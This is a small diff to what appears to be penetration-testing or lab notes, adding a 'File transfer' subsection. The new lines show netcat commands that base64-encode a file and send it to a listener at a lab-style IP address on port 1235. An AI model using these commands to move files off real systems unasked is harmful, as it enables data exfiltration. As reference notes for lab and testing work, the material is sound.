@@ -39,6 +39,16 @@
 
 ### File transfer
 
+#### nc
+
+```
+Receiver:
+nc -lnvp 1235 | base64 -d > binaryfile
+
+Sender:
+base64  binaryfile | nc -w 3 10.10.15.130 1235
+````
+
 #### python
 
 ```python
